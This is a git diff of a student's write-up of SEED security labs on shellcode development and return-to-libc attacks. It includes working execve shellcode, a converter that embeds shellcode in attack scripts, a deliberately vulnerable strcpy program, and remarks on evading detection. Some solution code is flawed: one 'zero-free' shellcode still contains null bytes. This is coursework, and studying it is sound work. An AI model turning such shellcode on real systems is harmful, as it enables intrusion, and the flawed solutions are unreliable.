@@ -10,6 +10,776 @@ see the code and documentation
 - code : [/Shellcode/](./Shellcode/)
 - documentation : [Shellcode/Shellcode.md](./Shellcode/Shellcode.md)
 
+## 3.1 SEED Lab (20 pts)
+Shellcode Development Lab
+https://seedsecuritylabs.org/Labs_20.04/Software/Shellcode/
+
+### Task 1: Writing Assembly Code
+
+To be able to have a direct control over what instructions to use in a shellcode, the best way to write a
+shellcode is to use an assembly language. In this task, we will use a sample program to get familiar with the
+development environment.
+Assembly languages are different for different computer architectures. In this task, the sample code
+(hello.s) is for the amd64 (64-bit) architecture. The code is included in the Labsetup folder. Students
+SEED Labs – Shellcode Development Lab 2
+working on Apple silicon machines can find the arm version of the sample code in the Labsetup/arm
+folder.
+
+##### Listing 1: A sample amd64 assembly program (hello.s)
+
+```hello.s
+global _start
+section .text
+_start:
+mov rdi, 1 ; the standard output
+mov rsi, msg ; address of the message
+mov rdx, 15 ; length of the message
+mov rax, 1 ; the number of the write() system call
+syscall ; invoke write(1, msg, 15)
+mov rdi, 0 ;
+mov rax, 60 ; the number for the exit() system call
+syscall ; invoke exit(0)
+section .rodata
+msg: db "Hello, world!", 10
+```
+
+##### Compiling to object code
+
+We compile the assembly code above using nasm, which is an assembler and
+disassembler for the Intel x86 and x64 architectures. For the arm64 architecture, the corresponding tool is
+called as. The -f elf64 option indicates that we want to compile the code to 64-bit ELF binary format.
+The Executable and Linkable Format (ELF) is a common standard file format for executable file, object
+code, shared libraries. For 32-bit assembly code, elf32 should be used.
+
+```
+// For amd64
+$ nasm -f elf64 hello.s -o hello.o
+// For arm64
+$ as -o hello.o hello.s
+```
+
+##### Linking to generate final binary
+
+Once we get the object code hello.o, if we want to generate the
+executable binary, we can run the linker program ld, which is the last step in compilation. After this step,
+we get the final executable code hello. If we run it, it will print out "Hello, world!".
+
+```
+// For both amd64 and arm64
+$ ld hello.o -o hello
+$ ./hello
+Hello, world!
+```
+
+##### Getting the machine code
+
+In most attacks, we only need the machine code of the shellcode, not a stan-
+dalone executable file, which contains data other than the actual machine code. Technically, only the ma-
+chine code is called shellcode. Therefore, we need to extract the machine code from the executable file or
+the object file. There are various ways to do that. One way is to use the objdump command to disassemble
+the executable or object file.
+SEED Labs – Shellcode Development Lab 3
+For amd64, there are two different common syntax modes for assembly code, one is the AT&T syntax
+mode, and the other is Intel syntax mode. By default, objdump uses the AT&T mode. In the following, we
+use the -Mintel option to produce the assembly code in the Intel mode.
+
+```
+$ objdump -Mintel -d hello.o
+hello.o: file format elf64-x86-64
+Disassembly of section .text:
+0000000000000000 <_start>:
+0: bf 01 00 00 00 mov edi,0x1
+5: 48 be 00 00 00 00 00 movabs rsi,0x0
+c: 00 00 00
+f: ba 0f 00 00 00 mov edx,0xf
+14: b8 01 00 00 00 mov eax,0x1
+19: 0f 05 syscall
+1b: bf 00 00 00 00 mov edi,0x0
+20: b8 3c 00 00 00 mov eax,0x3c
+25: 0f 05 syscall
+```
+
+In the above printout, the numbers after the colons are machine code. You can also use the xxd com-
+mand to print out the content of the binary file, and you should be able to find out the shellcode’s machine
+code from the printout.
+
+```
+$ xxd -p -c 20 hello.o
+7f454c4602010100000000000000000001003e00
+...
+000000001800000000000000bf0100000048be00
+00000000000000ba0f000000b8010000000f05bf
+00000000b83c0000000f05000000000000000000
+...
+```
+
+#### Task
+
+Your task is to go through the entire process: compiling and running the sample code, and then get
+the machine code from the binary.
+
+![alt text](task1.png)
+
+### Task 2: Writing Shellcode (Approach 1)
+
+The main purpose of shellcode is to actually quite simple: to run a shell program such as /bin/sh. In the
+Ubuntu operating system, this can be achieved by invoking the execve() system call.
+`execve("/bin/sh", argv[], 0)`
+We need to pass three arguments to this system call: In the amd64 architecture, they are are passed
+through the rdi, rsi, and rdx registers. In the arm64 architecture, they are passed through the x0, x1,
+and x2 registers. The pseudo code is listed below:
+
+```
+// For amd64 architrecture
+Let rdi = address of the "/bin/sh" string
+Let rsi = address of the argv[] array
+Let rdx = 0
+Let rax = 59 // 59 is execve’s system call number
+syscall // Invoke execve()
+// For the arm64 architrecture
+Let x0 = address of the "/bin/sh" string
+Let x1 = address of the argv[] array
+Let x2 = 0
+Let x8 = 221 // 221 is execve’s system call number
+svc 0x1337 // Invoke execve()
+```
+
+The main challenge of writing a shellcode is how to get the address of the "/bin/sh" string and the
+address of the argv[] array? They are two typical approaches:
+• Approach 1: Store the string and the array in the code segment, and then get their addresses using the
+PC register, which points to the code segment. We focus on this approach in this task.
+• Approach 2: Dynamically construct the string and the array on the stack, and then use the stack pointer
+register to get their addresses. We focus on this approach in the next task.
+
+#### Task 2.a. Understand the code
+
+We provide a sample shellcode below. This code is for the amd64 architecture. The code can also be found
+in the Labsetup folder. If you are working on this lab on an Apple silicon machine, you can find the
+sample arm64 code in the arm sub-folder.
+Listing 2: A sample 64-bit shellcode (mysh64.s)
+```mysh64.s
+section .text
+    global _start
+    _start:
+        BITS 64
+        jmp short two
+    one:
+        pop rbx
+
+        mov [rbx+8], rbx    ; store rbx to memory at address rbx + 8
+        mov rax, 0x00       ; rax = 0
+        mov [rbx+16], rax   ; store rax to memory at address rbx + 16
+        mov rdi, rbx        ; rdi = rbx (1)
+        lea rsi, [rbx+8]    ; rsi = rbx +8 (2)
+        mov rdx, 0x00       ; rdx = 0
+        mov rax, 59         ; rax = 59
+        syscall
+    two:
+        call one
+        db ’/bin/sh’, 0      ; The command string (terminated by a zero) ¬
+        db ’AAAAAAAA’        ; Place holder for argv[0]
+        db ’BBBBBBBB’        ; Place holder for argv[1]
+```
+
+The code above first jumps to the instruction at location two, which does another jump (to location
+one), but this time, it uses the call instruction. This instruction is for function call, i.e., before it jumps
+SEED Labs – Shellcode Development Lab 5
+to the target location, it saves the address of the next instruction (i.e., the return address) on the top of the
+stack, so when the function returns, it can return to the instruction right after the call instruction.
+In this example, the “instruction” right after the call instruction is not actually an instruction; it stores
+a string. However, this does not matter, the call instruction will push its address (i.e., the string’s address)
+into the stack, in the return address field of the function frame. When we get into the function, i.e., after
+jumping to location one, the top of the stack is where the return address is stored. Therefore, the pop rbx
+instruction actually get the address of the string on Line ¬, and save it to the rbx register. That is how the
+address of the string is obtained.
+
+##### Tasks. Please do the following tasks
+
+1. Compile and run the code, and see whether you can get a shell. The -g option enables the debugging
+information, as we will debug the code.
+
+```
+// For amd64
+$ nasm -g -f elf64 -o mysh64.o mysh64.s
+$ ld --omagic -o mysh64 mysh64.o
+// For arm64
+$ as -g -o mysh64.o mysh64.s
+$ ld --omagic -o mysh64 mysh64.o
+```
+
+Note. We need to use the `--omagic` option when running the linker program ld. By default, the
+code segment is not writable. When this program runs, it needs to modify the data stored in the code
+region; if the code segment is not writable, the program will crash. This is not a problem for actual
+attacks, because in attacks, the code is typically injected into a writable data segment (e.g. stack or
+heap). Usually we do not run shellcode as a standalone program.
+2. Use `gdb` to debug the program, and show how the program gets the address of the shell string
+`/bin/sh`.
+3. Explain how the program constructs the `argv[]` array, and show which lines set the values for
+`argv[0]` and `argv[1]`, respectively.
+4. Explain the real meaning of Lines 1 and 2.
+Common gdb commands. Here are some gdb commands that may be useful to this lab. To know how
+to use other gdb commands, inside gdb, you can type help to get a list of command class names. Type
+help followed by a class name, and you can get a list of commands in that class.
+
+```
+$ gdb mysh64
+help -- Print out the help information
+break one -- Set a break point at section "one"
+run -- Start debugged program.
+step -- Step program until it reaches a different source line.
+print $rbx -- Print out the value of the rbx register
+x/40bx <addr> -- Print out the memory at address <addr>
+x/40bx $rsp -- Print out the top 40 bytes of the stack
+x/5gx $rsp -- Print out the top 4 double-word (8 bytes) of the stack
+quit -- Exit from gdb
+```
+##### solution
+
+ 1. From the compilation and debugging output, we can see the code was successfully compiled and a shell was obtained.(Shellcode/task2_output.txt)
+
+ 2. The program gets the `/bin/sh` string address through the following sequence:
+    - Code jumps to `two`, which executes `call one`
+    - The `call` instruction pushes the address of the next instruction (string location) onto stack
+    - `pop rbx` retrieves this address (0x4000ad) which points to `/bin/sh`
+    - Memory dump shows string bytes at 0x4000ad: `2f 62 69 6e 2f 73 68` (/bin/sh)
+
+ 3. The argv[] array is constructed as:
+    - `mov [rbx+8], rbx` sets argv[0] to point to "/bin/sh" string
+    - `mov [rbx+16], rax` sets argv[1] to NULL (terminator)
+    Memory layout:
+    - rbx -> "/bin/sh"
+    - rbx+8 -> points to "/bin/sh" (argv[0])
+    - rbx+16 -> NULL (argv[1])
+
+ 4. Lines 1-2 prepare execve() arguments:
+    - `mov rdi, rbx` - Line 1 sets first arg (filename) to "/bin/sh" address
+    - `lea rsi, [rbx+8]` - Line 2 sets second arg (argv) to address of argv array
+
+![task2](task2.png)
+
+#### Task 2.b. Eliminate zeros from the code
+
+Shellcode is widely used in buffer-overflow attacks. In many cases, the vulnerabilities are caused by string
+copy, such as the strcpy() function. For these string copy functions, zero is considered as the end of the
+string. Therefore, if we have a zero in the middle of a shellcode, string copy will not be able to copy anything
+after the zero, so the attack will not be able to succeed. Although not all the vulnerabilities have issues with
+zeros, it becomes a requirement for shellcode not to have any zero in the machine code; otherwise, the
+application of a shellcode will be limited.
+The sample code provided in the previous section is not a true shellcode, because it contains several
+zeros. Please use the objdump command to get the machine code of the shellcode and mark all the instruc-
+tions that have zeros in the machine code.
+To eliminate these zeros, you need to rewrite the shellcode mysh64.s, replacing the problematic in-
+structions with an alternative. Section 5 provides some approaches that you can use to get rid of zeros.
+Please show the revised mysh64.s and explain how you get rid of each single zero from the code.
+
+##### solution
+Here's the revised code
+
+- code : `Shellcode/mysh64_no_zero.s`
+- gdb output : `Shellcode/task2b_output.txt`
+
+```nasm
+section .text
+    global _start
+    _start:
+        BITS 64
+        jmp short two
+    one:
+        pop rbx
+
+        ; Zero out al without using immediate zero
+        xor al, al
+        mov [rbx+7], al   ; Null terminate /bin/sh
+
+        ; Store rbx to memory without direct mov
+        push rbx
+        pop qword [rbx+8]  ; Replaces 'mov [rbx+8], rbx'
+
+        ; Zero out rax without immediate zero
+        xor rax, rax      ; Replaces 'mov rax, 0x00'
+        mov [rbx+16], rax ; Store null terminator for argv
+
+        ; Setup execve arguments
+        mov rdi, rbx      ; First arg: command string
+        lea rsi, [rbx+8]  ; Second arg: argv array
+        xor rdx, rdx      ; Third arg: envp=NULL (replaces 'mov rdx, 0x00')
+
+        ; Setup syscall number without immediate value
+        xor rax, rax
+        mov al, 59        ; syscall number for execve
+        syscall
+    two:
+        call one
+        db '/bin/sh', 0xFF    ; Command string (terminated later by code)
+        db 'AAAAAAAA'         ; Placeholder for argv[0]
+        db 'BBBBBBBB'         ; Placeholder for argv[1]
+```
+
+Explanations of the zero-eliminating modifications:
+
+1. **Null terminator for `/bin/sh`**:
+   - Original: `mov byte [rbx+7], 0`
+   - New: Use `xor al, al` to get zero, then `mov [rbx+7], al`
+
+2. **Moving rbx to memory**:
+   - Original: `mov [rbx+8], rbx`
+   - New: Use `push rbx` followed by `pop qword [rbx+8]`
+
+3. **Zeroing rax**:
+   - Original: `mov rax, 0x00`
+   - New: `xor rax, rax`
+
+4. **Zeroing rdx**:
+   - Original: `mov rdx, 0x00`
+   - New: `xor rdx, rdx`
+
+5. **Setting syscall number**:
+   - Original: `mov rax, 59`
+   - New: First `xor rax, rax` then `mov al, 59`
+   - This ensures only the lower byte is set, avoiding zeros in the higher bytes
+
+6. **String termination**:
+   - Original: Immediate zero in string
+   - New: Use 0xFF as placeholder and programmatically write the null terminator
+
+
+#### Task 2.c. Run a more complicated command
+
+Inside mysh64.s, we construct the argv[] array for the execve() system call. Since our command is
+/bin/sh, without any command-line arguments, our argv array only contains two elements: the first one
+is a pointer to the command string, and the second one is zero.
+In this task, we need to run the following command, i.e., we want to use execve to execute the follow-
+ing command, which uses /bin/bash to execute the "echo hello; ls -la" command.
+`/bin/bash -c "echo hello; ls -la"`
+In this new command, the argv array should have the following four elements, all of which need to be
+constructed on the stack. Please modify mysh64.s and demonstrate your execution result. As usual, you
+cannot have any zero in your shellcode.
+
+```
+argv[0] = address of the "/bin/bash" string
+argv[1] = address of the "-c" string
+argv[2] = address of the command string "echo hello; ls -la"
+argv[3] = 0
+```
+##### solution
+- code : `Shellcode/mysh64_bash.s`
+- screenshots :
+![task2c](task2c.png)
+
+```nasm
+section .text
+  global _start
+    _start:
+        BITS 64
+        jmp short two
+    one:
+        pop rbx           ; rbx points to the string area
+
+        ; Set up /bin/bash string termination
+        xor al, al
+        mov [rbx+9], al  ; Terminate /bin/bash
+
+        ; Set up -c string termination
+        mov [rbx+12], al ; Terminate -c
+
+        ; Set up command string termination
+        mov [rbx+31], al ; Terminate the command string
+
+        ; Set up argv array
+        lea rax, [rbx]        ; /bin/bash string
+        mov [rbx+32], rax     ; argv[0]
+
+        lea rax, [rbx+10]     ; -c string
+        mov [rbx+40], rax     ; argv[1]
+
+        lea rax, [rbx+13]     ; command string
+        mov [rbx+48], rax     ; argv[2]
+
+        xor rax, rax
+        mov [rbx+56], rax     ; argv[3] = NULL
+
+        ; Execute execve
+        mov rdi, rbx          ; First arg: pathname
+        lea rsi, [rbx+32]     ; Second arg: argv array
+        xor rdx, rdx          ; Third arg: envp = NULL
+        mov al, 59            ; syscall number for execve
+        syscall
+
+    two:
+        call one
+        ; String table
+        db '/bin/bash'    ; 9 bytes
+        db 0xFF
+        db '-c'           ; 2 bytes
+        db 0xFF
+        db 'echo hello; ls -la'  ; 18 bytes
+        db 0xFF
+        ; Space for argv array (4 pointers = 32 bytes)
+        db 'AAAAAAAA'     ; argv[0]
+        db 'BBBBBBBB'     ; argv[1]
+        db 'CCCCCCCC'     ; argv[2]
+        db 'DDDDDDDD'     ; argv[3]
+```
+
+Key changes made:
+
+1. Changed `/bin/sh` to `/bin/bash`
+2. Added the `-c` argument
+3. Added the command string `echo hello; ls -la`
+4. Modified the array structure to hold 4 elements instead of 2
+5. Updated all the offsets accordingly
+6. Added proper null termination for all strings
+7. Created the complete argv array with all required pointers
+
+```
+
+This should execute bash with the command `echo hello; ls -la`, which will:
+1. Print "hello" to the console
+2. Show a detailed listing of the current directory
+
+The shellcode avoids null bytes by:
+- Using `xor` to generate zeros
+- Using `0xFF` as string terminators initially
+- Using minimal registers where possible
+- Using `lea` for address calculations
+
+#### 3.4 Task 2.d. Pass environment variables
+
+The third parameter for the execve() system call is a pointer to the environment variable array, and it
+allows us to pass environment variables to the program. In our sample program, we pass a null pointer to
+execve(), so no environment variable is passed to the program. In this task, we will pass some environ-
+ment variables.
+If we change the command "/bin/sh" in our shellcode mysh64.s to "/usr/bin/env", which
+is a command to print out the environment variables. You can find out that when we run our shellcode, there
+will be no output, because our process does not have any environment variable.
+In this task, we will write a shellcode called myenv64.s. When this program is executed, it executes
+the "/usr/bin/env" command, which can print out the following environment variables:
+
+```
+$ ./myenv64
+aaa=hello
+bbb=world
+ccc=hello world
+```
+
+To write such a shellcode, we need to construct an environment variable array on the stack, and store the
+address of this array to the rdx register, before invoking execve(). The way to construct this array on
+the stack is exactly the same as the way how we construct the argv[] array. See the following:
+
+```
+env[0] = address to the "aaa=hello" string
+env[1] = address to the "bbb=world" string
+env[2] = address to the "ccc=hello world" string
+env[3] = 0 // 0 marks the end of the array
+```
+##### solution
+
+- code : `solution/mysh64_execve.s`
+
+```nasm
+section .text
+  global _start
+    _start:
+        BITS 64
+        jmp short two
+    one:
+        pop rbx                ; Get address of "/usr/bin/env"
+
+        ; Terminate the command string
+        xor al, al
+        mov [rbx+11], al      ; Null terminate "/usr/bin/env"
+
+        ; Set up env strings
+        mov [rbx+12], rbx     ; Store address of command as argv[0]
+        mov [rbx+28], rax     ; Null terminate argv array
+
+        ; Store addresses of environment strings
+        lea rcx, [rbx+20]     ; Address of "aaa=hello"
+        mov [rbx+40], rcx     ; env[0]
+        lea rcx, [rbx+30]     ; Address of "bbb=world"
+        mov [rbx+48], rcx     ; env[1]
+        lea rcx, [rbx+40]     ; Address of "ccc=hello world"
+        mov [rbx+56], rcx     ; env[2]
+        mov qword [rbx+64], 0 ; env[3] = NULL
+
+        ; Execute execve
+        mov rdi, rbx          ; First arg: command path
+        lea rsi, [rbx+12]     ; Second arg: argv array
+        lea rdx, [rbx+40]     ; Third arg: envp array
+        mov rax, 59           ; syscall number for execve
+        syscall
+
+    two:
+        call one
+        ; Command and strings
+        db '/usr/bin/env', 0      ; The command string
+        db 'AAAAAAAA'             ; Placeholder for argv[0]
+        db 'BBBBBBBB'             ; Null terminator for argv
+        db 'aaa=hello', 0         ; env[0]
+        db 'bbb=world', 0         ; env[1]
+        db 'ccc=hello world', 0   ; env[2]
+        db 'AAAAAAAA'             ; Placeholder for env array
+        db 'BBBBBBBB'
+        db 'CCCCCCCC'
+        db 'DDDDDDDD'
+```
+
+This shellcode does the following:
+
+1. Uses `/usr/bin/env` instead of `/bin/sh` as the command
+2. Sets up the environment variables array with three strings:
+   - "aaa=hello"
+   - "bbb=world"
+   - "ccc=hello world"
+3. Properly terminates both the argv and envp arrays with NULL
+4. Passes the environment array to execve() through the rdx register
+
+When executed, it should output:
+```
+aaa=hello
+bbb=world
+ccc=hello world
+```
+
+The main differences from `mysh64.s` are:
+1. Different command string (/usr/bin/env)
+2. Addition of environment variable strings
+3. Construction of the environment array (envp)
+4. Passing the environment array to execve via rdx
+
+
+### Task 3: Writing Shellcode (Approach 2)
+
+Another approach to get the shell string and the argv[] array is to dynamically construct them on the
+stack, and then use the stack pointer register to get their addresses. A sample shellcode (for amd64) using
+this approach is listed below. Both amd64 and arm64 code can be found from the Labsetup folder.
+Brief explanation of the code is given in the comment, but if students want to see a full explanation, they
+can find much more detailed explanation of the code in the SEED book.
+
+```Listing 3: Shellcode using the stack approach (another sh64.s)
+section .text
+global _start
+_start:
+xor rdx, rdx ; rdx = 0
+push rdx ; push 0 into the stack (terminate the string below)
+mov rax,’/bin//sh’
+push rax ; push the string into the stack
+mov rdi, rsp ; rdi = address of the command string
+push rdx ; push argv[1]=0 into stack
+push rdi ; push argv[0] into stack
+mov rsi, rsp ; rsi = address of the argv[] array
+xor rax, rax
+mov al, 59 ; execve()
+syscall
+```
+
+We can use the following commands to compile the assemble code into
+64-bit binary code:
+
+```
+// For amd64
+$ nasm -f elf64 mysh_64.s -o mysh_64.o
+$ ld mysh_64.o -o mysh_64
+// For arm64
+$ as mysh_64.s -o mysh_64.o
+$ ld mysh_64.o -o mysh_64
+```
+
+#### Task 3.a. The code example shows how to execute "/bin/sh". In this task, we need to revise the
+
+shellcode, so it can execute a more complicated shell command listed in the following. Please write your
+code to achieve this. You need to show that there is no zero in your code.
+`/bin/bash -c "echo hello; ls -la"`
+
+##### solution
+
+- code : `Shellcode/another_sh64_bash.c`
+- solution :
+```nasm
+section .text
+global _start
+_start:
+    ; Clear registers
+    xor rdx, rdx    ; Clear rdx for null terminator
+    xor rax, rax    ; Clear rax
+
+    ; Push the command string "echo hello; ls -la" (in reverse)
+    push rdx        ; Push null terminator
+    mov rax, 'a'    ; Build command string piece by piece
+    push rax
+    mov rax, 'ls -l'
+    push rax
+    mov rax, 'llo; '
+    push rax
+    mov rax, 'ho he'
+    push rax
+    mov rax, 'ec'
+    push rax
+    mov r8, rsp     ; Save pointer to command string
+
+    ; Push "-c" (in reverse)
+    push rdx        ; Push null terminator
+    mov rax, 'c-'
+    push rax
+    mov r9, rsp     ; Save pointer to "-c"
+
+    ; Push "/bin/bash" (in reverse)
+    push rdx        ; Push null terminator
+    mov rax, 'bash'
+    push rax
+    mov rax, '/bin/'
+    push rax
+    mov r10, rsp    ; Save pointer to "/bin/bash"
+
+    ; Set up array of pointers for execve
+    push rdx        ; NULL terminator
+    push r8         ; Push pointer to command string
+    push r9         ; Push pointer to "-c"
+    push r10        ; Push pointer to "/bin/bash"
+    mov rdi, r10    ; First argument: "/bin/bash"
+    mov rsi, rsp    ; Second argument: pointer to array
+
+    ; Execute execve syscall
+    push 59
+    pop rax         ; syscall number for execve
+    syscall
+```
+
+This shellcode:
+
+1. Creates the command strings in reverse order to avoid null bytes
+2. Stores the three main components:
+   - The shell command `"echo hello; ls -la"`
+   - The `-c` parameter
+   - The path `/bin/bash`
+3. Sets up the argument array for execve
+4. Makes the syscall
+
+
+#### Task 3.b. Please compare the two approaches in this lab. Which one do you like better, and why?
+
+First Approach (mysh64_bash.s):
+- Uses call/jmp technique to get string addresses
+- Stores strings in a data section
+- Manually sets up null terminators
+- Creates argv array in a pre-allocated space
+- More static in nature
+
+Second Approach (another_sh64_bash.s):
+- Uses stack-based string construction
+- Builds strings dynamically in reverse
+- Uses registers to track pointers
+- More dynamic and compact
+- Avoids null bytes naturally through stack operations
+
+I prefer the second approach for several reasons:
+
+1. **Portability**: The stack-based approach is more position-independent since it doesn't rely on fixed memory locations. This makes it more suitable for injection scenarios.
+
+2. **Compactness**: The code is more concise and uses stack operations efficiently. It doesn't need pre-allocated space for strings or arrays.
+
+3. **Security**: It's harder to detect because:
+   - It doesn't have obvious string patterns that could be flagged by security tools
+   - The strings are constructed dynamically
+   - It avoids null bytes naturally through its design
+
+4. **Flexibility**: The stack-based approach is easier to modify for different commands without worrying about space allocation or string table modifications.
+
+5. **Cleaner Code**: Despite being more sophisticated, the logic is actually clearer - each step (string construction, argument setup, syscall) is distinct and well-organized.
+
+The first approach is more straightforward to understand initially, but the second approach represents better shellcode crafting practices, especially for real-world scenarios where size, stealth, and portability matter.
+
+The main tradeoff is that the second approach might be slightly harder to read for beginners, but its benefits in terms of security and reliability make it the superior choice for actual exploitation scenarios.
+
+### 5 Guidelines: Getting Rid of Zeros
+
+There are many techniques that can get rid of zeros from the shellcode. In this section, we discuss some of the
+common techniques that you may find useful for this lab. Although the common ideas are the same for both
+amd64 and arm64 architectures, the instructions are different. In this section, we use amd64 instructions
+as examples. Students can working on Apple silicon machines can find the guidelines from this online
+document: Writing ARM64 shellcode (in Ubuntu).
+• If we want to assign zero to rax, we can use "mov rax, 0", but doing so, we will get zeros in the
+machine code. A typical way to solve this problem is to use "xor rax, rax", i.e., we xor rax
+with itself, the result is zero, which is saved to rax.
+• If we want to store 0x99 to rax. We cannot just use "mov rax, 0x99", because the second
+operand is expanded to 8 bytes, i.e., 0x0000000000000099, which contains seven zeros. To solve
+this problem, we can first set rax to zero, and then assign a one-byte number 0x99 to the al register,
+which represent the least significant 8 bits of the eax register.
+xor rax, rax
+mov al, 0x99
+• Another way is to use shift. Again, let us store 0x99 to rax. We first store 0xFFFFFFFFFFFF99 to
+rax. Second, we shift this register to the left for 56 bits; now rax contains 0x9900000000000000.
+Then we shift the register to the right for 56 bits; the most significant 56 bits (7 bytes) will be filled
+with 0x00. After that, rax will contain 0x00000000000099.
+mov rax, 0xFFFFFFFFFFFFFF99
+shl rax, 56
+shr rax, 56
+• Strings need to be terminated by zero, but if we define a string using the first line of the following,
+we will have a zero in the code. To solve this problem, we define a string using the second line, i.e.,
+putting a non-zero byte (0xFF) at the end of the string first.
+db ’abcdef’, 0x00
+db ’abcdef’, 0xFF
+After getting the address of the string, we can dynamically change the non-zero byte to 0x00. As-
+suming that we have saved the address of the string to rbx. We also know the length of the string
+(excluding the zero) is 6; Therefore, we can use the following instructions to replace the 0xFF with
+0x00.
+xor al, al
+mov [rbx+6], al
+SEED Labs – Shellcode Development Lab 9
+
+### 6 Submission
+
+You need to submit a detailed lab report, with screenshots, to describe what you have done and what you
+have observed. You also need to provide explanation to the observations that are interesting or surprising.
+Please also list the important code snippets followed by explanation. Simply attaching code without any
+explanation will not receive credits.
+
+### A Using the shellcode in attacking code
+
+In actual attacks, we need to include the shellcode in our attacking code, such as a Python or C program.
+We usually store the machine code in an array, but converting the machine code printed above to the array
+assignment in Python and C programs is quite tedious if done manually, especially if we need to perform this
+process many times in the lab. We wrote the following Python code to help this process. Just copy whatever
+you get from the xxd command (only the shellcode part) and paste it to the following code, between the
+lines marked by """. The code can be downloaded from the lab’s website.
+Listing 4: convert.py
+
+```convert.py
+# !/usr/bin/env python3
+
+# Run "xxd -p -c 20 mysh.o", and
+
+# copy and paste the machine code part to the following
+
+ori_sh ="""
+31db31c0b0d5cd80
+31c050682f2f7368682f62696e89e3505389e131
+d231c0b00bcd80
+"""
+sh = ori_sh.replace("\n", "")
+length = int(len(sh)/2)
+print("Length of the shellcode: {}".format(length))
+s = ’shellcode= (\n’ + ’ "’
+for i in range(length):
+s += "\\x" + sh[2*i] + sh[2*i+1]
+if i > 0 and i % 16 == 15:
+s += ’"\n’ + ’ "’
+s += ’"\n’ + ").encode(’latin-1’)"
+print(s)
+```
+
+The convert.py program will print out the following Python code that you can include in your attack
+code. It stores the shellcode in a Python array.
+
+```bash
+$ ./convert.py
+Length of the shellcode: 35
+shellcode= (
+"\x31\xdb\x31\xc0\xb0\xd5\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+"\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0"
+"\x0b\xcd\x80"
+).encode(’latin-1’)
+```
 
 
 ## 3.2 SEED Lab (30 pts)
@@ -20,6 +790,9 @@ see the code and documentation
 - code : [Return_to_Libc/](./Return_to_Libc/)
 - documentation : [Return_to_Libc/Return_to_Libc.md](./Return_to_Libc/Return_to_Libc.md)
 
+## 3.2 SEED Lab (30 pts)
+Return-to-libc Attack Lab
+https://seedsecuritylabs.org/Labs_20.04/Software/Return_to_Libc/
 
 #### 2 Environment Setup
 
@@ -82,49 +855,53 @@ in a later task.
 Listing 1: The vulnerable program (retlib.c)
 
 ```c
-# include <stdlib.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
 
-# include <stdio.h>
-
-# include <string.h>
-
-# ifndef BUF_SIZE
-
-# define BUF_SIZE 12
-
-# endif
+#ifndef BUF_SIZE
+#define BUF_SIZE 12
+#endif
 
 int bof(char *str)
 {
-char buffer[BUF_SIZE];
-unsigned int *framep;
-// Copy ebp into framep
-asm("movl %%ebp, %0" : "=r" (framep));
-/* print out information for experiment purpose*/
-printf("Address of buffer[] inside bof(): 0x%.8x\n", (unsigned)buffer);
-printf("Frame Pointer value inside bof(): 0x%.8x\n", (unsigned)framep);
-strcpy(buffer, str);fi buffer overflow!
-return 1;
+    char buffer[BUF_SIZE];
+    unsigned int *framep;
+
+    // Copy ebp into framep
+    asm("movl %%ebp, %0" : "=r" (framep));
+
+    /* print out information for experiment purpose */
+    printf("Address of buffer[] inside bof():  0x%.8x\n", (unsigned)buffer);
+    printf("Frame Pointer value inside bof():  0x%.8x\n", (unsigned)framep);
+
+    strcpy(buffer, str);
+
+    return 1;
 }
+
+void foo(){
+    static int i = 1;
+    printf("Function foo() is invoked %d times\n", i++);
+    return;
+}
+
 int main(int argc, char **argv)
 {
-char input[1000];
-FILE *badfile;
-badfile = fopen("badfile", "r");
-int length = fread(input, sizeof(char), 1000, badfile);
-printf("Address of input[] inside main(): 0x%x\n", (unsigned int) input);
-printf("Input size: %d\n", length);
-SEED Labs – Return-to-libc Attack Lab 4
-bof(input);
-printf("(ˆ_ˆ)(ˆ_ˆ) Returned Properly (ˆ_ˆ)(ˆ_ˆ)\n");
-return 1;
+   char input[1000];
+   FILE *badfile;
+
+   badfile = fopen("badfile", "r");
+   int length = fread(input, sizeof(char), 1000, badfile);
+   printf("Address of input[] inside main():  0x%x\n", (unsigned int) input);
+   printf("Input size: %d\n", length);
+
+   bof(input);
+
+   printf("(^_^)(^_^) Returned Properly (^_^)(^_^)\n");
+   return 1;
 }
-// This function will be used in the optional task
-void foo(){
-static int i = 1;
-printf("Function foo() is invoked %d times\n", i++);
-return;
-}
+
 ```
 
 The above program has a buffer overflow vulnerability. It first reads an input up to 1000 bytes from
@@ -213,6 +990,23 @@ Breakpoint 1, 0x56556327 in main ()
 $1 = {<text variable, no debug info>} 0xf7e12420 <system>
 $2 = {<text variable, no debug info>} 0xf7e04f80 <exit>
 ```
+##### solution
+
+- code : `Return_to_Libc/retlib.c`
+- script : `Return_to_Libc/gdb_command.txt`
+- output : `Return_to_Libc/task1_output.txt`
+- screenshot : `Return_to_Libc/task1_screenshot.png`
+
+```gdb_command.txt
+break main
+run
+p system
+p exit
+quit
+```
+
+![task1_screenshot.png](task1.png)
+
 
 #### 3.2 Task 2: Putting the shell string in the memory
 
@@ -238,15 +1032,13 @@ MYSHELL=/bin/sh
 
 We will use the address of this variable as an argument to system() call. The location of this variable
 in the memory can be found out easily using the following program:
-
 ```
 void main(){
-char* shell = getenv("MYSHELL");
-if (shell)
-printf("%x\n", (unsigned int)shell);
+    char* shell = getenv("MYSHELL");
+    if (shell)
+        printf("%x\n", (unsigned int)shell);
 }
 ```
-
 Compile the code above into a binary called prtenv. If the address randomization is turned off, you
 will find out that the same address is printed out. When you run the vulnerable program retlib inside the
 same terminal, the address of the environment variable will be the same (see the special note below). You
@@ -259,6 +1051,81 @@ of retlib.
 You should use the -m32 flag when compiling the above program, so the binary code prtenv will
 be for 32-bit machines, instead of for 64-bit ones. The vulnerable program retlib is a 32-bit binary, so if
 prtenv is 64-bit, the address of the environment variable will be different.
+
+##### solution
+
+1. Set the Environment Variable
+
+   Create a shell script `change_env.sh` to set the environment variable `MYSHELL` to `/bin/sh`:
+
+   ```bash
+   #!/bin/bash
+   export MYSHELL=/bin/sh
+   env | grep MYSHELL
+   MYSHELL=/bin/sh
+
+   ```
+
+   Save the script as `change_env.sh` and make it executable:
+
+   ```bash
+   chmod +x change_env.sh
+   ```
+
+   Run the script to set the environment variable:
+
+   ```bash
+   ./change_env.sh
+   ```
+
+2. Print the Address of the Environment Variable**
+
+   Create a C program `prtenv.c` to retrieve and print the memory address of the `MYSHELL` environment variable:
+
+   ```c
+   #include <stdio.h>
+   #include <stdlib.h>
+
+   void main() {
+       // Get the address of the MYSHELL environment variable
+       char* shell = getenv("MYSHELL");
+       if (shell) {
